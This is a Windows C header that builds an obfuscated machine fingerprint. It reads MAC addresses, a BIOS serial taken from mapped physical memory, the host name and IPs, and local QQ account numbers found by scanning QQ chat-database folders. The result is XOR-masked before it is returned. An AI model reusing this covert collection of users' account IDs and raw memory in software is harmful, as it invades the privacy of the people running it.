#ifndef _HARDINFO_H_
#define _HARDINFO_H_

#include <windows.h>
#include <Iphlpapi.h>
#include <winsock.h>

//结构定义 
typedef struct _UNICODE_STRING 
{ 
    USHORT  Length;//长度 
    USHORT  MaximumLength;//最大长度 
    PWSTR  Buffer;//缓存指针 
} UNICODE_STRING,*PUNICODE_STRING; 

typedef struct _OBJECT_ATTRIBUTES 
{ 
    ULONG Length;//长度 18h 
    HANDLE RootDirectory;//  00000000 
    PUNICODE_STRING ObjectName;//指向对象名的指针 
    ULONG Attributes;//对象属性00000040h 
    PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR，0 
    PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE，0 
} OBJECT_ATTRIBUTES; 
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES; 

//函数指针变量类型
typedef DWORD  (__stdcall *ZWOS )( PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES); 
typedef DWORD  (__stdcall *ZWMV )( HANDLE,HANDLE,PVOID,ULONG,ULONG,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG); 
typedef DWORD  (__stdcall *ZWUMV )( HANDLE,PVOID); 

BOOL GetMACAddress(BYTE * pBuffer, DWORD * pdwLen)
{
	IP_ADAPTER_INFO iai;
    ULONG uSize = 0;
	
	typedef DWORD (WINAPI *PFNGETADAPTERSINFO) (PIP_ADAPTER_INFO pAdapterInfo, PULONG pOutBufLen);
	HMODULE hIphlpapi = LoadLibraryA("Iphlpapi.dll"); 
	if( !hIphlpapi )
		return FALSE;
	PFNGETADAPTERSINFO pfn = (PFNGETADAPTERSINFO) GetProcAddress(hIphlpapi, "GetAdaptersInfo"); 
	if( !pfn )
		return FALSE;

	DWORD dwResult = (*pfn)(&iai, &uSize);
	if( dwResult == ERROR_BUFFER_OVERFLOW )
	{
		IP_ADAPTER_INFO* piai = (IP_ADAPTER_INFO*) malloc(uSize);
		if( piai != NULL )
		{
			dwResult = (*pfn)(piai, &uSize);
			if( ERROR_SUCCESS == dwResult )
			{
				IP_ADAPTER_INFO* piai2 = piai;

				DWORD len_needed = 0;
				int n = 0;

				// first get the length we need
				len_needed += sizeof(int);
				while(piai2 != NULL)
				{
					len_needed += sizeof(int);
					len_needed += piai2->AddressLength;
					n ++;
					piai2 = piai2->Next;                        
				}

				if( *pdwLen < len_needed )
				{
					*pdwLen = len_needed;
					free(piai);
					return FALSE;
				}

				piai2 = piai;
				memcpy(pBuffer, &n, sizeof(int));
				pBuffer += sizeof(int);
				while( piai2 != NULL )
				{
					memcpy(pBuffer, &piai2->AddressLength, sizeof(int));
					pBuffer += sizeof(int);
					memcpy(pBuffer, piai2->Address, piai2->AddressLength);
					pBuffer += piai2->AddressLength;
					piai2 = piai2->Next;                        
				}
				*pdwLen = len_needed;
			}
			free(piai);
		}
		else
		{
			FreeLibrary(hIphlpapi);
			return FALSE;
		}
	}
	else
	{
		FreeLibrary(hIphlpapi);
		return FALSE;
	}

	FreeLibrary(hIphlpapi);
	return TRUE;
}

UINT FindAwardBios( BYTE** ppBiosAddr )
{
    BYTE* pBiosAddr = * ppBiosAddr + 0xEC71;
    
    BYTE szBiosData[128];
    CopyMemory( szBiosData, pBiosAddr, 127 );
    szBiosData[127] = 0;
    
    int iLen = lstrlenA( ( char* )szBiosData );
    if( iLen > 0 && iLen < 128 )
    {
        //AWard:         07/08/2002-i845G-ITE8712-JF69VD0CC-00 
        //Phoenix-Award: 03/12/2002-sis645-p4s333
        if( szBiosData[2] == '/' && szBiosData[5] == '/' )
        {
            BYTE* p = szBiosData;
            while( * p )
            {
                if( * p < ' ' || * p >= 127 )
                {
                    break;
                }
                ++ p;
            }
            if( * p == 0 )
            {
                * ppBiosAddr = pBiosAddr;
                return ( UINT )iLen;
            }
        }
    }
    return 0;
}

UINT FindAmiBios( BYTE** ppBiosAddr )
{
    BYTE* pBiosAddr = * ppBiosAddr + 0xF478;
    
    BYTE szBiosData[128];
    CopyMemory( szBiosData, pBiosAddr, 127 );
    szBiosData[127] = 0;
    
    int iLen = lstrlenA( ( char* )szBiosData );
    if( iLen > 0 && iLen < 128 )
    {
        // Example: "AMI: 51-2300-000000-00101111-030199-"
        if( szBiosData[2] == '-' && szBiosData[7] == '-' )
        {
            BYTE* p = szBiosData;
            while( * p )
            {
                if( * p < ' ' || * p >= 127 )
                {
                    break;
                }
                ++ p;
            }
            if( * p == 0 )
            {
                * ppBiosAddr = pBiosAddr;
                return ( UINT )iLen;
            }
        }
    }
    return 0;
}

UINT FindPhoenixBios( BYTE** ppBiosAddr )
{
    UINT uOffset[4] = { 0x6577, 0x7196, 0x7550, 0xeb23};
    for( UINT i = 0; i < 4; ++ i )
    {
        BYTE* pBiosAddr = * ppBiosAddr + uOffset[i];

        BYTE szBiosData[128];
        CopyMemory( szBiosData, pBiosAddr, 127 );
        szBiosData[127] = 0;

        int iLen = lstrlenA( ( char* )szBiosData );
        if( iLen > 0 && iLen < 128 )
        {
			// Example: Phoenix "NITELT0.86B.0044.P11.9910111055"
            if( szBiosData[7] == '.' && szBiosData[11] == '.' )
            {
                BYTE* p = szBiosData;
                while( * p )
                {
                    if( * p < ' ' || * p >= 127 )
                    {
                        break;
                    }
                    ++ p;
                }
                if( * p == 0 )
                {
                    * ppBiosAddr = pBiosAddr;
                    return ( UINT )iLen;
                }
            }
			else if( szBiosData[8] == '.' && szBiosData[12] == '.' )
            {
                BYTE* p = szBiosData;
                while( * p )
                {
                    if( * p < ' ' || * p >= 127 )
                    {
                        break;
                    }
                    ++ p;
                }
                if( * p == 0 )
                {
                    * ppBiosAddr = pBiosAddr;
                    return ( UINT )iLen;
                }
            }
        }
    }

	{
	// last opportunity, we search IBIOSI$ to locate the SN part
	for(UINT i=0; i<0xffff-128-7; i++)
	{
		BYTE* pBiosAddr = *ppBiosAddr + i;
		const char * pattern = "IBIOSI$";
		if( memcmp(pBiosAddr, pattern, strlen(pattern)) == 0 )
		{
			pBiosAddr += strlen(pattern);
			BYTE szBiosData[128];
			CopyMemory( szBiosData, pBiosAddr, 127 );
			szBiosData[127] = 0;

			int iLen = lstrlenA((char* )szBiosData);
			BYTE * p = szBiosData;
			while( * p )
			{
				if( * p < ' ' || * p >= 127 )
				{
					break;
				}
				++ p;
			}
			if( * p == 0 )
			{
				* ppBiosAddr = pBiosAddr;
				return ( UINT )iLen;
			}

		}
	}
	}

    return 0;
}

BOOL GetBiosSN(BYTE * pBuffer, DWORD * pdwLen)
{
    SIZE_T ssize; 

    LARGE_INTEGER so; 
    so.LowPart=0x000f0000;
    so.HighPart=0x00000000; 
    ssize=0xffff; 
    wchar_t strPH[30]=L"\\device\\physicalmemory"; 

    DWORD ba=0;

    UNICODE_STRING struniph; 
    struniph.Buffer=strPH; 
    struniph.Length=0x2c; 
    struniph.MaximumLength =0x2e; 

    OBJECT_ATTRIBUTES obj_ar; 
    obj_ar.Attributes =64;
    obj_ar.Length =24;
    obj_ar.ObjectName=&struniph;
    obj_ar.RootDirectory=0; 
    obj_ar.SecurityDescriptor=0; 
    obj_ar.SecurityQualityOfService =0; 

	OSVERSIONINFO ovi = {0};
    ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&ovi);
	bool bWin98 = FALSE;
    
    if( ovi.dwPlatformId != VER_PLATFORM_WIN32_NT )
    	bWin98 = TRUE;    

	__try
	{
		if( !bWin98 )
		{
			HMODULE hinstLib = LoadLibraryA("ntdll.dll"); 
			if( !hinstLib )
				return FALSE;

			ZWOS ZWopenS=(ZWOS)GetProcAddress(hinstLib,"ZwOpenSection"); 
			ZWMV ZWmapV=(ZWMV)GetProcAddress(hinstLib,"ZwMapViewOfSection"); 
			ZWUMV ZWunmapV=(ZWUMV)GetProcAddress(hinstLib,"ZwUnmapViewOfSection"); 
			if( !ZWopenS || !ZWmapV || !ZWunmapV )
				return FALSE;
    
			//调用函数，对物理内存进行映射 
			HANDLE hSection; 
			if( 0 == ZWopenS(&hSection,4,&obj_ar) && 
				0 == ZWmapV( 
				(HANDLE)hSection,   //打开Section时得到的句柄 
				(HANDLE)0xFFFFFFFF, //将要映射进程的句柄， 
				&ba,                  //映射的基址 
				0,
				0xFFFF,               //分配的大小 
				&so,                  //物理内存的地址 
				&ssize,               //指向读取内存块大小的指针 
				1,                    //子进程的可继承性设定 
				0,                    //分配类型 
				2                     //保护类型 
				))
			//执行后会在当前进程的空间开辟一段64k的空间，并把f000:0000到f000:ffff处的内容映射到这里 
			//映射的基址由ba返回,如果映射不再有用,应该用ZwUnmapViewOfSection断开映射 
			{
				BYTE* pBiosSerial = (BYTE*)ba;
				UINT uBiosSerialLen = FindAwardBios(&pBiosSerial);
				if( uBiosSerialLen == 0U )
				{
					uBiosSerialLen = FindAmiBios(&pBiosSerial);
					if( uBiosSerialLen == 0U )
					{
						uBiosSerialLen = FindPhoenixBios(&pBiosSerial);
					}
				}
				if( uBiosSerialLen != 0U )
				{
					if( *pdwLen < uBiosSerialLen )
						return FALSE;

					memcpy(pBuffer, &uBiosSerialLen, sizeof(int));
					pBuffer += sizeof(int);
					memcpy(pBuffer, pBiosSerial, uBiosSerialLen + 1);
					*pdwLen = sizeof(int) + uBiosSerialLen;
					return TRUE;
				}
				ZWunmapV((HANDLE)0xFFFFFFFF, (void*)ba);
			}
		}
		else
		{
			BYTE* pBiosSerial = (BYTE *)0x000f0000;
			UINT uBiosSerialLen = FindAwardBios(&pBiosSerial);
			if( uBiosSerialLen == 0U )
			{
				uBiosSerialLen = FindAmiBios(&pBiosSerial);
				if( uBiosSerialLen == 0U )
				{
					uBiosSerialLen = FindPhoenixBios(&pBiosSerial);
				}
			}
			if( uBiosSerialLen != 0U )
			{
				if( *pdwLen < uBiosSerialLen )
					return FALSE;

				memcpy(pBuffer, &uBiosSerialLen, sizeof(int));
				pBuffer += sizeof(int);
				memcpy(pBuffer, pBiosSerial, uBiosSerialLen + 1);
				*pdwLen = sizeof(int) + uBiosSerialLen;
				return TRUE;
			}
		}
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		return FALSE;
	}

	return FALSE;
}

BOOL GetQQIDListFromPath(const char * path, int ids[11], int * num)
{
	*num = 0;

	char		szSrcFile[MAX_PATH];
	char		szPath[MAX_PATH];

	strcpy(szPath, path);

	if( szPath[0] && szPath[strlen(szPath) - 1] != '\\' )
	{
		strcat(szPath, "\\");
	}

	sprintf(szSrcFile, "%s%s", szPath, "*.*");
	
	WIN32_FIND_DATAA fd;
	// We have to find the source file here;
	HANDLE hFind = FindFirstFileA(szSrcFile, &fd);
	if( INVALID_HANDLE_VALUE == hFind )
		return TRUE;

	do
	{
		char szFileName[MAX_PATH];
		
		sprintf(szFileName, "%s%s", szPath, fd.cFileName);
		strlwr(szFileName);

		if( fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
		{
			if( 0 == stricmp(fd.cFileName, ".") ||
				0 == stricmp(fd.cFileName, "..") )
				continue;

			char szNewSrcFile[MAX_PATH];
			strcpy(szNewSrcFile, szFileName);
			strcat(szNewSrcFile, "\\MsgEx.db");
			WIN32_FIND_DATAA newfd;
			// We have to find the source file here;
			HANDLE hNewFind = FindFirstFileA(szNewSrcFile, &newfd);
			if( INVALID_HANDLE_VALUE != hNewFind )
			{
				int id = atoi(fd.cFileName);
				if( id != 0 )
				{
					ids[*num] = id;
					(*num) ++;
					if( *num >= 10 )
						break;
				}

				FindClose(hNewFind);
			}
		}

	} while( FindNextFileA(hFind, &fd) );

	FindClose(hFind);
	return TRUE;
}

BOOL GetQQID(int ids[11], int * num)
{
	// first get qq's install path
	HKEY hQQ;
	char path[MAX_PATH];
	DWORD type;
	DWORD len = MAX_PATH;

	if( ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, "software\\tencent\\qq", 0, KEY_READ, &hQQ) )
	{
		if( ERROR_SUCCESS == RegQueryValueExA(hQQ, "Install", NULL, &type, (BYTE*)path, &len) )
		{
			if( type == REG_SZ )
			{
				GetQQIDListFromPath(path, ids, num);
			}
		}
		
		RegCloseKey(hQQ);
	}

	ids[*num] = time(NULL);
	(*num) ++;
	return TRUE;
}

BOOL GetHostIP(BYTE * pBuffer, DWORD * pdwLen)
{
	WORD wVersionRequested;
	WSADATA wsaData; 
	int err;
	wVersionRequested = MAKEWORD( 2, 2 );
	err = WSAStartup(wVersionRequested, &wsaData);
	if( err != 0 )
		return FALSE;
	
	char szhn[256];
	int nStatus = gethostname(szhn, sizeof(szhn));
	if( nStatus == SOCKET_ERROR )
	{
		WSACleanup();
		return FALSE;
	}
	int len_name = strlen(szhn);
	if( *pdwLen < len_name + sizeof(int) + sizeof(int) )
	{
		WSACleanup();
		return FALSE;
	}

	memcpy(pBuffer, &len_name, sizeof(int));
	pBuffer += sizeof(int);
	memcpy(pBuffer, szhn, len_name);
	pBuffer += len_name;
	HOSTENT *host = gethostbyname(szhn);
	if (host != NULL)
	{
		int n = 0;
		for(n=0; ; n++)
		{
			if( !host->h_addr_list[n] )
				break;
		}

		if( *pdwLen < (DWORD(host->h_length * n)) )
		{
			WSACleanup();
			return FALSE;
		}

		memcpy(pBuffer, &n, sizeof(int));
		pBuffer += sizeof(int);
		for(n=0; ; n++)
		{
			if( !host->h_addr_list[n] )
				break;

			memcpy(pBuffer, host->h_addr_list[n], host->h_length);
			pBuffer += host->h_length;
		}
	}

	WSACleanup();
	return TRUE;
}

void GetHardInfo(BYTE * buffer, DWORD * len)
{
	char szInfo[2049] = "";
	DWORD num_char = 0;

	memset(buffer, 0xf0, *len);
	memset(szInfo, 0, sizeof(szInfo));

	BYTE data[1024];
	DWORD dwLen = 1024;	
	if( GetMACAddress(data, &dwLen) )
	{
		BYTE * p = data;
		int n, i, j;
		n = *(int *)p;
		p += sizeof(int);
		for(i=0; i<n; i++)
		{
			int l = *(int *)p;
			p += sizeof(int);

			char szLine[128] = "";
			for(j=0; j<l; j++)
			{
				char szTemp[32];
				sprintf(szTemp, "%02x", *p);
				strcat(szLine, szTemp);
				p ++;
			}
			
			int len_line = strlen(szLine);
			if( num_char + len_line < 2048 )
			{
				strcpy(szInfo + num_char, szLine);
				num_char += len_line + 1; 
			}
			else
				return;
		}
	}
	
	dwLen = 1024;
	if( GetBiosSN(data, &dwLen) )
	{
		BYTE * p = data;
		int len_sn;
		len_sn = *(int *)p;
		p += sizeof(int);

		if( num_char + len_sn < 2048 )
		{
			strcpy(szInfo + num_char, (char *)p);
			num_char += len_sn + 1;
		}
		else
			return;
	}	

	int ids[11];
	int num = 0;
	if( GetQQID(ids, &num) )
	{
		for(int i=0; i<num; i++)
		{
			char szLine[128];
			sprintf(szLine, "%d", ids[i]);
			int len_line = strlen(szLine);
			if( num_char + len_line < 2048 )
			{
				strcpy(szInfo + num_char, szLine);
				num_char += len_line + 1;
			}
			else
				return;
		}
	}

	dwLen = 1024;
	if( GetHostIP(data, &dwLen) )
	{
		BYTE * p = data;
		int len_name = *(int *)p;
		p += sizeof(int);
		if( num_char + len_name < 2048 )
		{
			memcpy(szInfo + num_char, p, len_name);
			p += len_name;
			num_char += len_name;
			szInfo[num_char] = 0;
			num_char ++;
		}
		else
			return;

		int n = *(int *)p;
		p += sizeof(int);
		for(int i=0; i<n; i++)
		{
			char szIP[128];
			IN_ADDR addr = *(IN_ADDR*)p;
			p += sizeof(IN_ADDR);

			sprintf(szIP, "%d.%d.%d.%d", addr.S_un.S_un_b.s_b1, addr.S_un.S_un_b.s_b2, addr.S_un.S_un_b.s_b3, addr.S_un.S_un_b.s_b4);
			int len_addr = strlen(szIP);

			if( num_char + len_addr < 2048 )
			{
				strcpy(szInfo + num_char, szIP);
				num_char += len_addr + 1;
			}
			else
				return;
		}
	}

	szInfo[num_char] = '\0';
	num_char ++;

	BYTE mask[32] = {
		0x78, 0x89, 0x12, 0x56, 0xe9, 0x8e, 0x32, 0xf1, 
		0x1f, 0x90, 0x82, 0x99, 0x33, 0x23, 0x65, 0x7e,
		0x3f, 0x4a, 0x3e, 0x5b, 0x79, 0x80, 0x31, 0x23,
		0xf4, 0xe9, 0xe4, 0x3b, 0x88, 0x23, 0x11, 0xa5
	};

	for(DWORD n=0; n<num_char; n++)
	{
		szInfo[n] = szInfo[n] ^ mask[n % 32];
		BYTE t = szInfo[n];
		szInfo[n] = (((t & 0xc0) >> 6) | ((t & 0x3f) << 2));
	}

	/*
	for(n=0; n<num_char; n++)
	{
		BYTE t = szInfo[n];
		szInfo[n] = (((t & 0x3) << 6) | ((t & 0xfc) >> 2));
		szInfo[n] = szInfo[n] ^ mask[n % 32];
	}*/

	if( *len < num_char )
		*len = 0;
	else
	{
		*len = num_char;
		memcpy(buffer, szInfo, num_char);
	}
}

#endif//_HARDINFO_H_